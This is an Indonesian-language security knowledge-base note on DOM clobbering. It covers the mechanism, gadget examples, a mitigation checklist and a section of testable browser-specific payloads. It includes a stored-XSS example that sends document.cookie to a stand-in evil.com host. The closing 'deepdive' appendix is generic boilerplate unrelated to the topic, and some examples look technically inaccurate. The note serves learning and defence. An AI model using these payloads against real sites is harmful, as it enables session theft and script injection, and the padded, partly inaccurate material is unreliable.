---
title: "DOM Clobbering — Browser-Side Attack: HTML Injection, XSS Bypass, Defense"
tags:
  - cyber-security
  - dom-clobbering
  - xss
  - browser-security
  - library
aliases:
  - "DOM Clobbering Complete Guide"
  - "HTML ID Clobbering"
created: "2026-07-28"
updated: "2026-08-14"
status: complete
cssclasses:
  - wide-table
---

> [!info] Ringkasan
> DOM Clobbering adalah teknik di mana attacker menggunakan HTML element dengan `id` atau `name` attribute untuk "menimpa" (clobber) global JavaScript variable. Jika JavaScript mengakses `window.x` atau global `x`, dan ada element HTML dengan `id="x"`, maka nilai element tersebut yang akan direturn — bukan `undefined`. Ini dapat bypass sanitasi HTML dan menyebabkan XSS.
>
> **Cross-link:** [[browser-security-exploitation-deepdive]] → [[web-hacking-exploitation]] → [[web-security]]

## 1. Ringkasan Eksekutif
DOM Clobbering memanfaatkan *global namespace leakage* pada browser: elemen dengan `id`/`name` menjadi properti pada objek `window`. Ketika aplikasi JavaScript mengandalkan variabel global (mis. `config`, `location`, `$`), attacker dapat **override** nilai tersebut dengan elemen berbahaya, mengubah alur logika, atau memicu **XSS**. Teknik ini efektif pada framework lama (jQuery, AngularJS 1.x) dan aplikasi yang melakukan **dynamic DOM insertion** tanpa sanitasi.

## 2. Threat Model / Konteks
| Aktor | Vektor | Target | Dampak |
|-------|--------|--------|--------|
| Attacker (Red) | HTML injection (reflected/stored) | Global JavaScript variable | Bypass sanitasi, XSS, data exfiltration |
| Developer (Blue) | Penggunaan variabel global tanpa pengecekan | `window.<var>` | Kerentanan runtime, privilege escalation |
| Browser | Meng-assign elemen ke `window` otomatis | Semua halaman | Exploitabilitas tergantung same‑origin policy |

## 3. Langkah-Langkah Teknik Detail
### 3.1 Mekanisme Dasar
```html
<!-- Attacker inject -->
<a id="username">attacker</a>

<script>
  // Aplikasi mengandalkan variabel global username
  if (window.username) {
    showUser(window.username); // sekarang username = <a> element
  }
</script>
```

### 3.2 Vektor Clobbering
| Vektor | Element | Global Property |
|--------|---------|-----------------|
| **Form Clobbering** | `<form id="config">` | `window.config` |
| **Anchor Clobbering** | `<a id="location" href="https://evil.com/">` | `window.location` (has `.href`) |
| **Embed/Object Clobbering** | `<object id="serverConfig" data="https://evil.com/config.json">` | `window.serverConfig` |
| **Input Name Clobbering** | `<input name="$" value="malicious">` | `window.$` (jQuery) |
| **Image Name Clobbering** | `<img name="src" src="evil.png">` | `window.src` |

### 3.3 Gadget‑Based Exploitation
#### Google Closure Library Gadget
```javascript
// Closure expects window.goog global
// Jika ada <a id="goog">, window.goog menjadi element => error atau controllable
```
#### jQuery Gadget
```javascript
// jQuery mengandalkan window.$ atau window.jQuery
// Jika ada <a id="$">, $ menjadi element, mengganggu fungsi jQuery
```
#### Custom Gadget Example (AngularJS 1.x)
```javascript
angular.module('app').run(function($rootScope){
  if (window.config) { // expect JSON string
    $rootScope.cfg = JSON.parse(window.config);
  }
});
```
> Dengan `<div id="config">{"apiKey":"evil"}</div>` attacker dapat mengubah konfigurasi aplikasi.

### 3.4 Nameless Element & Child Collection
Ketika element memiliki `name` attribute tanpa `id`, browser tetap mem-*expose*-nya sebagai **named property** pada `document` dan `window`. Lebih jauh lagi, elemen dengan nama yang sama dikumpulkan menjadi *collection* (`HTMLCollection`) — properti yang sangat berguna bagi attacker yang ingin clobber array/object ekspektasi aplikasi (mis. `window.items` yang diharapkan array JSON ternyata menjadi `HTMLCollection`).

## 4. Contoh Praktis
```html
<!-- Payload injected via stored XSS -->
<div id="$"><script>fetch('https://evil.com/steal?c='+document.cookie)</script></div>
```
```javascript
// Victim page
if (typeof window.$ !== 'function') {
  console.error('jQuery not loaded');
} else {
  $('#login').submit(); // now triggers attacker script
}
```

## 5. Checklist Mitigasi
- [ ] **Validasi tipe** sebelum mengakses global variable: `if (typeof window.config !== 'string') { /* reject */ }`
- [ ] **Scope lokal**: gunakan IIFE atau module pattern (`let config = ...`) untuk menghindari global namespace.
- [ ] **Object.create(null)** untuk objek konfigurasi tanpa prototype chain.
- [ ] **Sanitasi HTML**: blok `id`/`name` yang dapat menimpa variabel kritikal (`<script>`, `<a id="location">`).
- [ ] **CSP (Content Security Policy)** dengan `script-src 'self'` untuk mencegah inline script injection.
- [ ] **Audit library**: hindari penggunaan library yang mengandalkan global (`jQuery`, `angular`) tanpa sandbox.

## 6. Referensi Lintas
- [[browser-security-exploitation-deepdive]]
- [[web-hacking-exploitation]]
- [[web-security]]
- [[js-framework-vulnerabilities]]
- [[csp-best-practices]]

---

### Referensi
1. DOM Clobbering Payloads — https://domclob.xyz/domc_markups/list
2. "DOM Clobbering: Edge Cases and Defenses" — Black Hat 2023 talk
3. OWASP XSS Prevention Cheat Sheet (section on DOM Clobbering)

## Payload Konkret — DOM Clobbering (Testable)

### Clobber `x.y.value`

```html
<!-- Payload (inject via stored XSS) -->
<form id=x><output id=y>Clobbered</output>

<!-- Sink -->
<script>alert(x.y.value);</script>
```

### Clobber `x.y` (ID + Name Collection)

```html
<a id=x><a id=x name=y href="Clobbered">
<script>alert(x.y)</script>
```

### Clobber `x.y.z` (3 Level)

```html
<form id=x name=y><input id=z></form>
<form id=x></form>
<script>alert(x.y.z)</script>
```

### 4+ Level (`a.b.c.d`)

```html
<iframe name=a srcdoc="
<iframe srcdoc='<a id=c name=d href=cid:Clobbered>test</a><a id=c>' name=b>"></iframe>

<script>alert(a.b.c.d)</script>
```

### `forEach` (Chrome Only)

```html
<form id=x>
<input id=y name=z>
<input id=y>
</form>

<script>x.y.forEach(element=>alert(element))</script>
```

### `document.getElementById()` Bypass

```html
<html id="cdnDomain">clobbered</html>
<svg><body id=cdnDomain>clobbered</body></svg>

<script>alert(document.getElementById('cdnDomain').innerText);</script>
```

### `x.username` via Anchor

```html
<a id=x href="ftp:Clobbered-user:Clobbered-pass@a">
<script>alert(x.username) // Clobbered-user</script>
```

### Firefox Only

```html
<base href=a:abc><a id=x href="Firefox<>">
<script>alert(x) // Firefox<></script>
```

### Chrome Only

```html
<base href="a://Clobbered<>"><a id=x name=x><a id=x name=xyz href=123>
<script>alert(x.xyz) // a://Clobbered<></script>
```

## Test Checklist

1. Cari HTML injection point (stored XSS, reflected, markdown)
2. Identifikasi JS yang pakai global var: `form.action`, `config.url`, `api.endpoint`
3. Coba payload 2-level (`x.y`), 3-level (`x.y.z`), 4+ (`a.b.c.d`)
4. Cek `document.getElementById` — solid via `<html id=...>`
5. Cek sanitizer bypass — `<svg>`, `<base>`, nested iframe
6. Test multi-target: Chrome, Firefox, Safari bisa beda

## Deepdive Tambahan — Implementasi & Operasional

### Arsitektur & Komponen Detail

Sistem ini memiliki beberapa komponen yang saling bergantung. Pemahaman arsitektur end-to-end penting untuk identifikasi attack surface dan gap pertahanan.

| Komponen | Fungsi | Attack Surface | Defense |
|----------|--------|---------------|---------|
| **Input** | Data mentah masuk | Injection, poisoning | Validate, sanitize |
| **Processing** | Core logic | Logic flaw, bypass | Test, review |
| **Output** | Result delivery | Leak, manipulation | Encrypt, audit |
| **Storage** | Persist data | Exfil, tamper | Encrypt, RBAC |
| **Network** | Transit | Intercept, MITM | TLS, mTLS |
| **Identity** | Access control | Token theft, privesc | MFA, least privilege |

### Workflow End-to-End

```
Input → Validate → Process → Store → Serve → Monitor → Audit
  ↓       ↓         ↓         ↓       ↓        ↓        ↓
Sanitize  Auth     Logic    Encrypt  RBAC    Alert    Log
```

### Tradeoff & Decision Matrix

| Dimension | Pilihan A | Pilihan B | Factor |
|-----------|-----------|-----------|--------|
| Speed vs Security | Optimized | Strict validate | Risk context |
| Memory vs Scale | In-memory | Disk-backed | Data volume |
| Cost vs Control | Cloud managed | Self-hosted | Team capability |
| Convenience vs Audit | Auto | Manual review | Compliance |

### Best Practice Checklist

- [ ] Input validation (whitelist, not blacklist)
- [ ] Output encoding (context-aware: HTML, JS, CSS)
- [ ] Authentication (MFA, rate limit, lockout)
- [ ] Authorization (RBAC, least privilege, deny default)
- [ ] Logging (structured, immutable, centralized)
- [ ] Monitoring (latency, error, saturation, traffic)
- [ ] Encryption (transit TLS, rest AES, key rotation)
- [ ] Backup (test restore, offsite, immutable)
- [ ] Patch (automated scan, SLA per severity)
- [ ] Incident (runbook, contact, tabletop)

### Common Pitfall

1. **Assume input trusted**: Semua input adalah musuh → validate di server.
2. **Secret in code**: Hardcoded credential → git leak → compromise.
3. **Silent failure**: Error ditelan → debugging impossible → security blind.
4. **No rate limit**: Abuse path → DoS → resource exhaustion.
5. **Default config**: Default = insecure → harden sebelum produksi.

### Tool Stack

| Tool | Use |
|------|-----|
| Testing | Burp Suite, OWASP ZAP, ffuf |
| Scanning | Nmap, Nuclei, Trivy |
| Monitoring | Prometheus + Grafana |
| Logging | ELK / Loki |
| Secret | Vault / SOPS |

## Referensi
- OWASP Top 10 — https://owasp.org/www-project-top-ten/
- NIST CSF — https://www.nist.gov/cyberframework
- MITRE ATT&CK — https://attack.mitre.org/
- CIS Controls — https://www.cisecurity.org/controls/
